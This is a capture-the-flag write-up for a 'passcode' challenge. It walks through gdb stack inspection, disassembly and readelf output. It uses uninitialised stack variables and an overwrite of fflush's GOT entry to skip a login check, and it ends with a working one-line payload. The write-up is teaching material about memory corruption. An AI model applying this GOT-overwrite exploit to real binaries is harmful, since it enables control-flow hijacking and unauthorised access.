### passcode

##### Done in collaboration with [moni286](https://github.com/moni286)

`ssh`ing into the machine we can see that there are three files: `passcode.c`, `passcode` and `flag`. The idea is to print `flag` using `passcode` executable that was compiled from `passcode.c`. (We cannot just `cat flag` because of permission issues but the executable can.)

#### The issue

Here's `passcode.c`:

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

At first glance, it might seem easy enough. Type in a name. Type in two numbers 338150 and 13371337. Viola! The flag should be output. Unfortunately, trying this will give a `segfault` because of the incorrect usage of `scanf`, which takes pointer to a variable and not the variable itself. So, how do we navigate around it?

#### The vulnerability

- the function `main()` calls function `welcome()`.
  - this expands the stack, puts the 100 characters input by the user in the variable `name`, prints a message with that name and exits.
  - Note that when the function `welcome()` exits, the stack goes back the size it was before the function being called.
- the function `main()` calls function `login()`.
  - the stack expands again, possibly over the same region that was earlier used by the function `welcome()`.
  - two variables, `passcode1` and `passcode2` are allocated in the stack. These variables **are not** initialized. Hence, if the stack does overlap with the area used by `name`, we might be able to control what initial values `passcode1` and `passcode2`have. If both their values can be controlled, we can fix the wrong use of `scanf`.
  - The values of the two variables are checked against some magic numbers and decisions made accordingly.

#### Verification

```assembly
$ gdb ./passcode
## first step is to get where the variable name in welcome is stored
(gdb) break *welcome
(gdb) run
(gdb) disas
Dump of assembler code for function welcome:
=> 0x08048609 <+0>:		push   %ebp
   0x0804860a <+1>:		mov    %esp,%ebp
   0x0804860c <+3>:		sub    $0x88,%esp
   0x08048612 <+9>:		mov    %gs:0x14,%eax
   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:	xor    %eax,%eax
   0x0804861d <+20>:	mov    $0x80487cb,%eax
   0x08048622 <+25>:	mov    %eax,(%esp)
   0x08048625 <+28>:	call   0x8048420 <printf@plt>
   0x0804862a <+33>:	mov    $0x80487dd,%eax
   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
   0x08048632 <+41>:	mov    %edx,0x4(%esp)
   0x08048636 <+45>:	mov    %eax,(%esp)
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:	mov    $0x80487e3,%eax
   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
   0x08048646 <+61>:	mov    %edx,0x4(%esp)
   0x0804864a <+65>:	mov    %eax,(%esp)
   0x0804864d <+68>:	call   0x8048420 <printf@plt>
   0x08048652 <+73>:	mov    -0xc(%ebp),%eax
   0x08048655 <+76>:	xor    %gs:0x14,%eax
   0x0804865c <+83>:	je     0x8048663 <welcome+90>
   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:	leave  
   0x08048664 <+91>:	ret    
End of assembler dump.
(gdb) break *welcome+53 ##break here to inspect where the name will be stored
(gdb) continue
Continuing.
enter you name : ppppppppppppppppppppppppppppppppppppppppppppppppp
## hits breakpoint
## inspect stack to see where the values (p => 0x70) are stored.
(gdb) x/$40x $esp 
0xffa41540:	0x080487dd	0xffa41558	0xffa415c8	0xf7da67ed
0xffa41550:	0xf7f09d80	0x080487f0	0x70707070	0x70707070
0xffa41560:	0x70707070	0x70707070	0x70707070	0x70707070
0xffa41570:	0x00707070	0x00000000	0xf7da6ab9	0xf7f07860
0xffa41580:	0x00000027	0xf7f09000	0xffa415c8	0xf7d9b4eb
0xffa41590:	0xf7f09d80	0x0000000a	0x00000027	0xf7f0c748
0xffa415a0:	0xf7f41f49	0x00000000	0xf7f09d80	0xfbad2a84
0xffa415b0:	0xffa415e8	0xf7f47da0	0xf7d9b36b	0xd8d41800
0xffa415c0:	0xf7f09000	0x00000000	0xffa415e8	0x0804867f
0xffa415d0:	0x080487f0	0x00000000	0x080486a9	0x00000000
### we can see that the values start getting stored at 0xffa41558
### and will go to next 100 characters till 0xffa415bc 
### side note: printf "%x\n" `echo $(( 0xffa41558 + 100 ))`
### now lets break at login and see where passcodeX are stored.
(gdb) break *login
(gdb) disas
Dump of assembler code for function login:
=> 0x08048564 <+0>:		push   %ebp
   0x08048565 <+1>:		mov    %esp,%ebp
   0x08048567 <+3>:		sub    $0x28,%esp
   0x0804856a <+6>:		mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp) ## passcode1 => 338150 = 0x528e6
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp) ## passcode2 => 13371337 = 0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret
## now we can know address of passcodeX relative to $ebp
## find out the actual values
(gdb) ni 2
(gdb) p $ebp-0x10
$1 = (void *) 0xffa415b8 ##address of passcode1
## name is in  0xffa41558 to 0xffa415bb
## hence the last 4 bytes(0xffa415bb - 0xffa415b8) of name is initial value of passcode1
```

#### The attack

We can control the initial value of `passcode1` only. This requires a change of plan (we can fix the `scanf` usage for both `passcode1` but not `passcode2`). So when the programs executes `scanf('%d', passcode1)` we get to write those 4 bytes (`%d` in encoded for an integer so it will be stored as 4 bytes) wherever we want in the system. A good place to write those 4 bytes is on the global offset table. From what I understand from [this walkthrough](https://www.youtube.com/watch?v=t0WP2UK5euo), for a dynamically linked program:

- when a dynamically linked program is run, the dynamically linked binaries are loaded at an address and this address is saved on the global offset table.
- now every time this function is called, the execution of the program jumps to that address. 
- for us, we would want to jump to the point right after values of `passcode1` and `passcode2` are checked so that we can get `Login Ok!` and the `flag`.

We can get the address to overwrite by using `readelf` on `passcode`.

```sh
$ readelf passcode
...
Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0 ## <========
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
...
```

We can get the address of where we want to jump by using `disas on login`.

```assembly
(gdb) disas login
...
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp) # <= verifies passcode1 
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp) # <= verifies passcode2
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)    # <= checks done, jump here
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret 
  ...
```

So the final attack payload is:

```sh
$ (python -c "print 'a'*96 + '\x04\xa0\x04\x08'"; echo $((0x080485d7)) )| ./passcode
```

